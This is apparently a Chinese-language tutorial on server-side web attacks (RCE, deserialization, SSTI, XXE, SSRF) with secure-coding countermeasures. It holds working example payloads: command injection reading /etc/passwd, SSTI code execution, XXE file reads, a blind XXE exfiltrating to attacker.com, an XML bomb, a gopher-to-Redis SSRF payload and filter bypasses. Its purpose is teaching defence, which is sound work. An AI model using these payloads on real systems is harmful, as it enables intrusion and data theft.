---
title: 2、服务端攻击技术
---
## 📚 目录

1. [远程代码执行（RCE）漏洞](#1-远程代码执行rce漏洞)
2. [反序列化攻击](#2-反序列化攻击)
3. [服务端模板注入（SSTI）](#3-服务端模板注入ssti)
4. [XXE外部实体注入](#4-xxe外部实体注入)
5. [SSRF服务端请求伪造](#5-ssrf服务端请求伪造)
6. [核心要点总结](#6-核心要点总结)

---

## 1. 🎯 远程代码执行（RCE）漏洞


### 1.1 什么是RCE漏洞


**🔸 通俗解释**
```
远程代码执行（Remote Code Execution）就像给了坏人一把万能钥匙：
- 正常情况：用户只能按照规定的方式使用网站功能
- RCE攻击：攻击者可以让服务器执行任意代码，就像拥有了管理员权限

形象比喻：
正常网站 = 自动售货机（只能按按钮买东西）
RCE漏洞 = 售货机后门被打开（可以随意操作内部系统）
```

**💡 RCE漏洞的危害级别**
```
危害程度：🔥🔥🔥🔥🔥 极高

可能造成的后果：
✅ 完全控制服务器
✅ 窃取所有数据
✅ 植入后门程序
✅ 跳板攻击其他系统
✅ 破坏系统和数据
```

### 1.2 常见RCE攻击场景


**🔹 命令注入攻击**
```php
// 危险的PHP代码示例
<?php
// 用户输入：127.0.0.1; cat /etc/passwd
$ip = $_GET['ip'];
$result = system("ping " . $ip);  // 直接拼接用户输入
echo $result;
?>

攻击流程图：
用户输入 → 服务器接收 → 拼接命令 → 系统执行 → 返回结果

正常输入：127.0.0.1
执行命令：ping 127.0.0.1

恶意输入：127.0.0.1; cat /etc/passwd
执行命令：ping 127.0.0.1; cat /etc/passwd  ← 执行了额外命令！
```

**🔹 文件上传漏洞**
```php
// 不安全的文件上传
<?php
$filename = $_FILES['upload']['name'];
move_uploaded_file($_FILES['upload']['tmp_name'], "uploads/" . $filename);
?>

攻击过程：
1. 攻击者上传恶意PHP文件：shell.php
2. 文件被保存到服务器：uploads/shell.php  
3. 攻击者访问：http://target.com/uploads/shell.php
4. 恶意代码在服务器执行
```

### 1.3 RCE防护措施


**🛡️ 输入验证与过滤**
```php
// 安全的命令执行方式
<?php
function safe_ping($ip) {
    // 1. 严格验证IP格式
    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
        return "无效IP地址";
    }
    
    // 2. 使用参数化命令
    $output = [];
    exec("ping -c 4 " . escapeshellarg($ip), $output);
    return implode("\n", $output);
}
?>
```

**🔒 核心防护原则**
```
🔸 输入验证：严格检查用户输入格式
🔸 参数化：使用安全的API而不是字符串拼接
🔸 权限控制：程序以最小权限运行
🔸 沙箱环境：隔离执行环境
🔸 文件类型限制：严格控制上传文件类型
```

---

## 2. 🧬 反序列化攻击


### 2.1 什么是序列化和反序列化


**🔸 通俗理解**
```
序列化 = 打包邮寄：
- 把复杂的对象（像一台电脑）打包成可传输的格式
- 就像把电脑拆解装箱，方便运输

反序列化 = 拆包组装：
- 把传输的数据重新组装成对象
- 就像收到包裹后重新组装电脑

正常流程：
对象 → 序列化 → 传输 → 反序列化 → 对象
```

**💻 序列化示例**
```java
// Java对象
class User {
    String name = "张三";
    int age = 25;
}

// 序列化后（简化表示）
"User{name='张三', age=25}"

// 反序列化：把字符串还原成User对象
User user = deserialize("User{name='张三', age=25}");
```

### 2.2 反序列化攻击原理


**🔸 攻击核心思想**
```
问题所在：程序相信了不可信的数据

攻击流程：
1. 攻击者构造恶意序列化数据
2. 程序反序列化时执行恶意代码
3. 获得系统控制权

就像：
- 正常情况：收到朋友寄来的礼物，放心拆开
- 攻击情况：收到陌生人的"礼物"，里面是炸弹
```

**🔹 Java反序列化攻击示例**
```java
// 危险的反序列化代码
public class VulnerableApp {
    public void processData(byte[] data) {
        try {
            ObjectInputStream ois = new ObjectInputStream(
                new ByteArrayInputStream(data)
            );
            Object obj = ois.readObject();  // 危险：直接反序列化用户数据
            // 处理对象...
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

攻击者可以：
1. 构造包含恶意代码的序列化数据
2. 发送给应用程序
3. 反序列化过程中执行恶意代码
```

### 2.3 不同语言的反序列化风险


**🔸 PHP反序列化**
```php
// 危险代码
class User {
    public $name;
    
    public function __wakeup() {
        // 反序列化时自动执行
        eval($this->name);  // 危险：执行任意代码
    }
}

// 攻击
$malicious = 'O:4:"User":1:{s:4:"name";s:10:"phpinfo();";}';
unserialize($malicious);  // 触发恶意代码执行
```

**🔸 .NET反序列化**
```csharp
// 危险的.NET反序列化
public void ProcessData(string data) {
    BinaryFormatter formatter = new BinaryFormatter();
    MemoryStream stream = new MemoryStream(Convert.FromBase64String(data));
    object obj = formatter.Deserialize(stream);  // 危险
}
```

### 2.4 反序列化攻击防护


**🛡️ 安全防护策略**
```
🔸 避免反序列化：优先使用JSON等安全格式
🔸 白名单验证：只允许反序列化已知安全的类
🔸 签名验证：对序列化数据进行签名校验
🔸 沙箱环境：在受限环境中执行反序列化
🔸 权限控制：限制反序列化程序的权限
```

**💡 安全的替代方案**
```java
// 推荐：使用JSON而不是Java序列化
public class SafeApp {
    private ObjectMapper mapper = new ObjectMapper();
    
    public User processUser(String jsonData) {
        // JSON反序列化相对安全
        return mapper.readValue(jsonData, User.class);
    }
}
```

---

## 3. 🎨 服务端模板注入（SSTI）


### 3.1 什么是模板引擎


**🔸 通俗理解**
```
模板引擎 = 填空题生成器：

模板：你好，{{name}}！今天是{{date}}。
数据：name="张三", date="2024年8月10日"
结果：你好，张三！今天是2024年8月10日。

常见模板引擎：
- Python：Jinja2、Django
- Java：Thymeleaf、Freemarker  
- JavaScript：Handlebars、Mustache
- PHP：Twig、Smarty
```

**💻 模板引擎示例**
```python
# Flask + Jinja2示例
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    template = "Hello {{name}}!"
    return render_template_string(template, name=name)

# 正常访问：/hello?name=张三
# 输出：Hello 张三!
```

### 3.2 SSTI攻击原理


**🔸 攻击核心**
```
问题：用户输入直接进入模板，被当作代码执行

攻击流程图：
用户输入 → 模板引擎 → 代码执行 → 系统控制

正常情况：
输入：张三
模板：Hello {{name}}!
输出：Hello 张三!

攻击情况：
输入：{{7*7}}
模板：Hello {{7*7}}!
输出：Hello 49!  ← 数学表达式被执行了！
```

**🔹 SSTI攻击示例**
```python
# 脆弱的代码
@app.route('/user/<username>')
def user_page(username):
    # 危险：用户输入直接拼接到模板
    template = f"<h1>Welcome {username}!</h1>"
    return render_template_string(template)

# 攻击载荷
# 访问：/user/{{config}}
# 结果：显示Flask配置信息

# 更危险的攻击：
# /user/{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].exit()}}
# 结果：可能导致服务器宕机或执行任意代码
```

### 3.3 不同模板引擎的SSTI


**🔸 Jinja2（Python）攻击示例**
```python
# 常见攻击载荷
{{config}}                    # 读取配置
{{''.__class__.__mro__[1]}}   # 获取object类
{{request.environ}}          # 读取环境变量
```

**🔸 Thymeleaf（Java）攻击示例**
```html
<!-- 攻击载荷 -->
${T(java.lang.Runtime).getRuntime().exec('whoami')}
${#ctx.request.servletContext}
```

### 3.4 SSTI防护措施


**🛡️ 防护策略**
```
🔸 输入验证：严格过滤用户输入
🔸 沙箱模式：使用受限的模板环境
🔸 禁用危险功能：关闭模板的代码执行功能
🔸 静态模板：避免动态生成模板
🔸 权限控制：限制模板引擎权限
```

**💡 安全的模板使用**
```python
# 安全方式：预定义模板
@app.route('/user/<username>')
def user_page(username):
    # 使用预定义的模板文件
    return render_template('user.html', username=username)

# user.html模板文件
# <h1>Welcome {{username|e}}!</h1>  # |e表示转义
```

---

## 4. 📄 XXE外部实体注入


### 4.1 什么是XML和外部实体


**🔸 XML基础概念**
```
XML = 结构化数据格式（像更复杂的HTML）

简单XML示例：
<?xml version="1.0" encoding="UTF-8"?>
<user>
    <name>张三</name>
    <age>25</age>
</user>

XML实体 = 变量或占位符：
<!ENTITY 实体名 "实体值">
使用：&实体名;

就像定义常量：
定义：<!ENTITY company "某某公司">
使用：欢迎来到&company;
结果：欢迎来到某某公司
```

**🔹 外部实体**
```xml
<!-- 内部实体（安全） -->
<!ENTITY internal "这是内部内容">

<!-- 外部实体（危险） -->
<!ENTITY external SYSTEM "file:///etc/passwd">
<!ENTITY web SYSTEM "http://evil.com/data.txt">

危险之处：可以读取服务器文件或发起网络请求
```

### 4.2 XXE攻击原理


**🔸 攻击核心思想**
```
XXE = 利用XML解析器读取服务器文件

攻击流程：
1. 攻击者构造包含恶意外部实体的XML
2. 服务器解析XML时加载外部资源
3. 泄露服务器敏感信息

攻击示意图：
攻击者 → 恶意XML → 服务器解析 → 读取系统文件 → 返回内容
```

**🔹 XXE攻击示例**
```xml
<!-- 攻击载荷：读取系统密码文件 -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
    <name>&xxe;</name>
    <age>25</age>
</user>

当服务器解析这个XML时：
- 遇到&xxe;会去读取/etc/passwd文件
- 文件内容被插入到<name>标签中
- 攻击者获得系统用户信息
```

**🔹 更危险的XXE攻击**
```xml
<!-- 读取任意文件 -->
<!ENTITY file SYSTEM "file:///var/www/config.php">

<!-- 内网探测 -->
<!ENTITY scan SYSTEM "http://192.168.1.100:8080/admin">

<!-- 拒绝服务攻击（XML炸弹） -->
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!-- 指数级增长，消耗服务器内存 -->
```

### 4.3 XXE攻击变种


**🔸 Blind XXE（盲注XXE）**
```xml
<!-- 无法直接看到结果，但可以确认漏洞存在 -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'http://attacker.com/?%file;'>">
%eval;
%error;

作用：将读取的文件内容发送到攻击者服务器
```

### 4.4 XXE防护措施


**🛡️ 防护策略**
```
🔸 禁用外部实体：配置XML解析器禁止加载外部实体
🔸 输入验证：检查XML内容，过滤危险元素
🔸 使用安全库：选择默认安全的XML解析器
🔸 网络隔离：限制服务器对外网络访问
🔸 权限控制：限制XML解析器的文件访问权限
```

**💡 安全的XML解析配置**
```java
// Java安全配置
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// 禁用外部DTD
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// 禁用外部实体
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

```python
# Python安全配置
from defusedxml import ElementTree
# 使用defusedxml库，默认禁用危险特性
root = ElementTree.fromstring(xml_data)
```

---

## 5. 🌐 SSRF服务端请求伪造


### 5.1 什么是SSRF


**🔸 通俗理解**
```
SSRF = 服务端请求伪造（Server-Side Request Forgery）

形象比喻：
正常情况：你让服务员帮你点餐（合理请求）
SSRF攻击：你让服务员去隔壁偷东西（恶意请求）

核心问题：攻击者让服务器发起攻击者控制的网络请求

SSRF攻击流程：
攻击者 → 发送恶意请求 → 服务器 → 访问内网/外网 → 返回结果
```

**🔹 SSRF攻击场景**
```
常见功能存在SSRF风险：
✅ 图片/文件下载：从URL获取文件
✅ 网页截图：访问指定URL生成截图
✅ 邮件发送：获取邮件模板
✅ RSS订阅：读取RSS源
✅ 网站监控：检查网站可用性
✅ API调用：调用第三方接口
```

### 5.2 SSRF攻击原理


**🔸 基础SSRF攻击**
```php
// 脆弱的文件下载功能
<?php
$url = $_GET['url'];
$content = file_get_contents($url);  // 危险：直接访问用户提供的URL
echo $content;
?>

正常使用：
http://victim.com/download.php?url=http://example.com/file.txt

恶意使用：
http://victim.com/download.php?url=file:///etc/passwd
http://victim.com/download.php?url=http://192.168.1.100/admin
```

**🔹 SSRF攻击目标**
```
内网探测攻击流程：
                    互联网
                      │
              ┌───────▼───────┐
              │   Web服务器   │ ← 攻击者控制
              │(公网IP)      │
              └───────┬───────┘
                      │
              ┌───────▼───────┐
              │   内网环境    │ ← 攻击目标
              │ 192.168.1.x   │
              │ 数据库、管理系统│
              └───────────────┘

攻击者通过Web服务器跳板，访问内网资源
```

### 5.3 SSRF攻击技术


**🔸 内网探测**
```python
# 扫描内网服务
targets = [
    "http://192.168.1.1:80",      # 路由器管理
    "http://192.168.1.100:22",    # SSH服务
    "http://192.168.1.200:3306",  # MySQL数据库
    "http://127.0.0.1:6379",      # Redis缓存
]

# 通过SSRF逐个探测
for target in targets:
    response = request_via_ssrf(target)
    if response:
        print(f"发现服务：{target}")
```

**🔸 协议利用**
```
支持的协议：
✅ http/https：访问Web服务
✅ file：读取本地文件
✅ ftp：访问FTP服务
✅ gopher：万能协议，可模拟多种协议
✅ dict：访问字典服务器

危险示例：
gopher://192.168.1.100:6379/_*1%0d%0a$4%0d%0aeval%0d%0a
# 通过gopher协议向Redis发送命令
```

### 5.4 SSRF绕过技术


**🔸 URL绕过技术**
```
IP地址编码绕过：
192.168.1.1 → 十进制：3232235777
192.168.1.1 → 十六进制：0xC0A80101
192.168.1.1 → 八进制：030052000401

域名绕过：
127.0.0.1 → localhost
127.0.0.1 → 127.1
127.0.0.1 → 0

短链接绕过：
http://192.168.1.1 → http://short.ly/abc123
```

**🔸 协议绕过**
```
大小写绕过：HTTP、Http、hTTp
编码绕过：http%3A%2F%2F192.168.1.1
双重编码：http%253A%252F%252F192.168.1.1
```

### 5.5 SSRF防护措施


**🛡️ 防护策略**
```
🔸 URL白名单：只允许访问指定域名
🔸 内网地址过滤：禁止访问内网IP段
🔸 协议限制：只允许http/https协议
🔸 端口限制：限制可访问的端口
🔸 响应内容检查：检查返回内容合法性
🔸 网络隔离：服务器网络访问限制
```

**💡 安全的URL验证**
```python
import ipaddress
from urllib.parse import urlparse

def is_safe_url(url):
    try:
        parsed = urlparse(url)
        
        # 1. 协议检查
        if parsed.scheme not in ['http', 'https']:
            return False
            
        # 2. 域名白名单检查
        allowed_domains = ['example.com', 'api.trusted.com']
        if not any(parsed.netloc.endswith(domain) for domain in allowed_domains):
            return False
            
        # 3. IP地址检查
        try:
            ip = ipaddress.ip_address(parsed.hostname)
            # 禁止内网地址
            if ip.is_private or ip.is_loopback:
                return False
        except:
            pass  # 域名形式的主机名
            
        return True
    except:
        return False
```

---

## 6. 📋 核心要点总结


### 6.1 服务端攻击技术概览


| 攻击类型 | **危害等级** | **攻击目标** | **核心原理** |
|---------|------------|-------------|-------------|
| **RCE远程代码执行** | 🔥🔥🔥🔥🔥 | 完全控制服务器 | 执行任意系统命令 |
| **反序列化攻击** | 🔥🔥🔥🔥🔥 | 代码执行 | 恶意对象构造 |
| **SSTI模板注入** | 🔥🔥🔥🔥☆ | 信息泄露/代码执行 | 模板代码注入 |
| **XXE实体注入** | 🔥🔥🔥☆☆ | 文件读取/内网探测 | XML外部实体解析 |
| **SSRF请求伪造** | 🔥🔥🔥☆☆ | 内网访问/信息收集 | 服务器端发起请求 |

### 6.2 攻击链路分析


```
典型服务端攻击流程：
                    
步骤1：信息收集
    ↓
步骤2：漏洞发现 (SSRF/XXE探测)
    ↓  
步骤3：权限获取 (RCE/反序列化)
    ↓
步骤4：权限维持 (后门植入)
    ↓
步骤5：横向渗透 (内网攻击)
```

### 6.3 防护策略总结


**🛡️ 通用防护原则**
```
输入验证三原则：
✅ 永不信任用户输入
✅ 严格验证所有外部数据  
✅ 使用白名单而非黑名单

最小权限原则：
✅ 程序以最小权限运行
✅ 限制网络访问权限
✅ 文件系统权限控制

纵深防护策略：
✅ 多层安全控制
✅ 网络隔离和监控
✅ 日志记录和告警
```

### 6.4 实战安全建议


**🔧 开发安全检查清单**
```
代码审计要点：
□ 检查所有用户输入处理
□ 验证文件上传功能安全性
□ 审查第三方库和依赖
□ 测试序列化/反序列化功能
□ 检查模板使用是否安全
□ 验证XML解析配置
□ 测试对外网络请求功能

安全配置要点：
□ 禁用不必要的服务和端口
□ 配置Web应用防火墙(WAF)
□ 启用安全HTTP头
□ 实施网络访问控制
□ 配置安全的错误页面
□ 启用日志记录和监控
```

**💡 学习建议**
```
实践环境：
✅ 搭建本地漏洞测试环境
✅ 使用DVWA、WebGoat等训练平台
✅ 参与CTF竞赛提升技能

持续学习：
✅ 关注最新安全漏洞和补丁
✅ 学习安全开发最佳实践
✅ 掌握常用安全测试工具
✅ 了解法律法规和伦理规范
```

**核心记忆**：
- 服务端攻击的核心是**突破信任边界**
- **输入验证**是防护的第一道防线
- **权限控制**是减小危害的关键
- **监控告警**是及时发现的保障
- **安全意识**是最重要的防护工具